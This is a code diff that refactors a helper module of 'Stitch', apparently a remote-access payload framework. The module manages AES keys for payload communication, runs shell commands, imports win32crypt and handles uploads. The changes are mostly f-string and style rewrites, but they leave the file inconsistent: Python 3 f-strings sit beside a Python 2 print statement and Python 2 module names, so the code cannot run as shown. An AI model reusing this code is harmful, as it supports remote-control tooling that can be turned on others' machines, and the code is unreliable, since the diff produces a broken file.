@@ -30,16 +30,15 @@ from Stitch_Vars.globals import *
 from Stitch_Vars.st_aes import *
 from colorama import Fore, Back, Style, init, deinit, reinit
 
+import readline
 if sys.platform.startswith('win'):
     init()
-    import readline
     import win32crypt
     p_bar = "="
     temp = 'C:\\Windows\\Temp\\'
     readline.parse_and_bind("tab: complete")
 else:
     temp = '/tmp/'
-    import readline
     import rlcompleter
     p_bar = '█'
     if 'libedit' in readline.__doc__:
@@ -53,11 +52,10 @@ if configuration_path not in sys.path:
 aes_lib = ConfigParser.ConfigParser()
 aes_lib.read(st_aes_lib)
 if aes_abbrev not in aes_lib.sections():
-    aesfile = open(st_aes_lib,'wb')
-    aes_lib.add_section(aes_abbrev)
-    aes_lib.set(aes_abbrev, 'aes_key', aes_encoded)
-    aes_lib.write(aesfile)
-    aesfile.close()
+    with open(st_aes_lib,'wb') as aesfile:
+        aes_lib.add_section(aes_abbrev)
+        aes_lib.set(aes_abbrev, 'aes_key', aes_encoded)
+        aes_lib.write(aesfile)
 
 def run_command(command):
     try:
@@ -78,13 +76,10 @@ def start_command(command):
              stdin=None, stdout=None, stderr=None, close_fds=True)
         return '[+] Command successfully started.\n'
     except Exception as e:
-        return '[!] {}\n'.format(str(e))
+        return f'[!] {str(e)}\n'
 
 def no_error(cmd_output):
-    if cmd_output.startswith("ERROR:") or cmd_output.startswith("[!]"):
-        return False
-    else:
-        return True
+    return not cmd_output.startswith("ERROR:") and not cmd_output.startswith("[!]")
 
 def encrypt(raw, aes_key=secret):
     iv = Random.new().read( AES.block_size )
@@ -99,7 +94,7 @@ def decrypt(enc, aes_key=secret):
 
 def show_aes():
     st_print('=== Stitch AES Key ===')
-    st_print('   {}'.format(aes_encoded))
+    st_print(f'   {aes_encoded}')
     st_print('[*] Copy and add this key to another system running Stitch to '\
               'enable communication from payloads created on this system.\n')
 
@@ -112,15 +107,14 @@ def add_aes(key):
         try:
             decr_key = base64.b64decode(key)
         except Exception as e:
-            err = "[!] Decryption error: {}\n".format(str(e))
+            err = f"[!] Decryption error: {str(e)}\n"
             st_print(err)
         else:
             if len(decr_key) != 32:
                 st_print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
             else:
-                aes_abbrev = '{}{}{}{}{}{}{}{}{}{}{}{}{}'.format(
-                    key[21],key[0],key[1],key[43],key[5],key[13],key[7],key[24],key[31],
-                    key[35],key[16],key[39],key[28])
+                aes_abbrev = f'{key[21]}{key[0]}{key[1]}{key[43]}{key[5]}{key[13]}{key[7]}{key[24]}{key[31]}{key[35]}{key[16]}{key[39]}{key[28]}'
+
                 sec_exists = False
                 if aes_abbrev in aes_lib.sections():
                     sec_exists = True
@@ -129,32 +123,22 @@ def add_aes(key):
                     if aes_lib.get(aes_abbrev,'aes_key') == key:
                         st_print('[*] The AES key has already been added to this system.\n')
                         return
-                aesfile = open(st_aes_lib,'wb')
-                if not sec_exists:
-                    aes_lib.add_section(aes_abbrev)
-                aes_lib.set(aes_abbrev, 'aes_key', key)
-                aes_lib.write(aesfile)
-                aesfile.close()
-                st_print('[+] Successfully added "{}" to the AES key library\n'.format(key))
+                with open(st_aes_lib,'wb') as aesfile:
+                    if not sec_exists:
+                        aes_lib.add_section(aes_abbrev)
+                    aes_lib.set(aes_abbrev, 'aes_key', key)
+                    aes_lib.write(aesfile)
+                st_print(f'[+] Successfully added "{key}" to the AES key library\n')
                 aes_lib.read(st_aes_lib)
 
 def windows_client(system = sys.platform):
-    if system.startswith('win'):
-        return True
-    else:
-        return False
+    return bool(system.startswith('win'))
 
 def osx_client(system = sys.platform):
-    if system.startswith('darwin'):
-        return True
-    else:
-        return False
+    return bool(system.startswith('darwin'))
 
 def linux_client(system = sys.platform):
-    if system.startswith('linux'):
-        return True
-    else:
-        return False
+    return bool(system.startswith('linux'))
 
 def st_print(text):
     if text.startswith('[+]'):
@@ -207,7 +191,7 @@ def print_red(string):
 
 def get_cwd():
     path = os.getcwd()
-    path = path + '>'
+    path = f'{path}>'
     return path
 
 def display_banner():
@@ -229,13 +213,9 @@ def check_int(val):
         return False
 
 def append_slash_if_dir(p):
-    if p and os.path.isdir(p) and p[-1] != os.sep:
-        return p + os.sep
-    else:
-        return p
+    return p + os.sep if p and os.path.isdir(p) and p[-1] != os.sep else p
 
 def find_patterns(text, line, begidx, endidx, search):
-    f = []
     before_arg = line.rfind(" ", 0, begidx)
     if before_arg == -1:
         return # arg not found
@@ -243,10 +223,7 @@ def find_patterns(text, line, begidx, endidx, search):
     fixed = line[before_arg+1:begidx]  # fixed portion of the arg
     arg = line[before_arg+1:endidx]
 
-    for n in search:
-        if n.startswith(arg):
-            f.append(n)
-    return f
+    return [n for n in search if n.startswith(arg)]
 
 def find_path(text, line, begidx, endidx, \
                 dir_only=False, files_only=False, exe_only=False,\
@@ -261,7 +238,7 @@ def find_path(text, line, begidx, endidx, \
 
     if uploads:
         os.chdir(uploads_path)
-    pattern = arg + '*'
+    pattern = f'{arg}*'
 
     completions = []
     for path in glob.glob(pattern):
@@ -273,13 +250,13 @@ def find_path(text, line, begidx, endidx, \
             if not os.path.isdir(path):
                 completions.append(path.replace(fixed, "", 1))
         elif exe_only:
-            if not os.path.isdir(path):
-                if path.endswith('.exe') or path.endswith('.py'):
-                    completions.append(path.replace(fixed, "", 1))
+            if not os.path.isdir(path) and (
+                path.endswith('.exe') or path.endswith('.py')
+            ):
+                completions.append(path.replace(fixed, "", 1))
         elif py_only:
-            if not os.path.isdir(path):
-                if path.endswith('.py'):
-                    completions.append(path.replace(fixed, "", 1))
+            if not os.path.isdir(path) and path.endswith('.py'):
+                completions.append(path.replace(fixed, "", 1))
         elif all_dir:
             if os.path.isdir(path):
                 path = append_slash_if_dir(path)
@@ -289,13 +266,7 @@ def find_path(text, line, begidx, endidx, \
     return completions
 
 def find_completion(text,opt_list):
-    option = []
-    for n in opt_list:
-        if text:
-            if n.startswith(text): option.append(n)
-        else:
-            option.append(n)
-    return option
+    return [n for n in opt_list if text and n.startswith(text) or not text]
 
 class progress_bar():
     def __init__(self,size):
@@ -308,11 +279,11 @@ class progress_bar():
 
     def file_info(self):
         file_size = convertSize(float(self.size))
-        st_print('Total Size: {} ({} bytes)'.format(file_size,self.size))
+        st_print(f'Total Size: {file_size} ({self.size} bytes)')
         self.display()
 
     def display(self):
-        p_output = "[{}] %0".format(" " * self.bar_size)
+        p_output = f'[{" " * self.bar_size}] %0'
         sys.stdout.write(p_output)
         sys.stdout.flush()
         sys.stdout.write("\b" * (len(p_output)))
@@ -326,7 +297,7 @@ class progress_bar():
                 self.tick += 1
                 space = self.bar_size - self.tick
                 total_percentage = 2 * self.tick
-                p_output = "[{}{}] %{}".format(p_bar * self.tick, ' ' * space, total_percentage)
+                p_output = f"[{p_bar * self.tick}{' ' * space}] %{total_percentage}"
                 sys.stdout.write(p_output)
                 sys.stdout.flush()
                 sys.stdout.write("\b" * (len(p_output)))
@@ -334,29 +305,31 @@ class progress_bar():
             self.tick = int((float(self.progress)/float(self.size)) * float(self.bar_size))
             space = self.bar_size - self.tick
             total_percentage = 2 * self.tick
-            p_output = "[{}{}] %{}".format(p_bar * self.tick, ' ' * space, total_percentage)
+            p_output = f"[{p_bar * self.tick}{' ' * space}] %{total_percentage}"
             sys.stdout.write(p_output)
             sys.stdout.flush()
             sys.stdout.write("\b" * (len(p_output)))
 
     def complete(self):
-        sys.stdout.write("[{}] %100\n".format(p_bar * self.bar_size))
+        sys.stdout.write(f"[{p_bar * self.bar_size}] %100\n")
         sys.stdout.flush()
 
 def print_border(length,border):
     print border * length
 
 def st_logger(resp,log_path,log_name,verbose=True):
-    if no_error(resp):
-        i = 1
-        log = os.path.join(log_path,'{}.log'.format(log_name))
-        while os.path.exists(log):
-            new_log_name = '{} ({}).log'.format(log_name,i)
-            log = os.path.join(log_path,new_log_name)
-            i += 1
-        if verbose: st_print("[+] Output has been written to {}\n".format(log))
-        with open(log,'w') as l:
-            l.write(resp)
+    if not no_error(resp):
+        return
+    i = 1
+    log = os.path.join(log_path, f'{log_name}.log')
+    while os.path.exists(log):
+        new_log_name = f'{log_name} ({i}).log'
+        log = os.path.join(log_path,new_log_name)
+        i += 1
+    if verbose:
+        st_print(f"[+] Output has been written to {log}\n")
+    with open(log,'w') as l:
+        l.write(resp)
 
 #http://stackoverflow.com/questions/2828953/silence-the-stdout-of-a-function-in-python-without-trashing-sys-stdout-and-resto
 @contextlib.contextmanager
@@ -376,13 +349,13 @@ def nostdout():
 
 #http://stackoverflow.com/questions/5194057/better-way-to-convert-file-sizes-in-python
 def convertSize(size):
-   if (size == 0):
-       return '0 Bytes'
-   size_name = ("Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
-   i = int(math.floor(math.log(size,1024)))
-   p = math.pow(1024,i)
-   s = round(size/p,2)
-   return '{} {}'.format(s,size_name[i])
+    if (size == 0):
+        return '0 Bytes'
+    size_name = ("Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
+    i = int(math.floor(math.log(size,1024)))
+    p = math.pow(1024,i)
+    s = round(size/p,2)
+    return f'{s} {size_name[i]}'
 
 def zipdir(path, zipn):
     for root, dirs, files in os.walk(path):
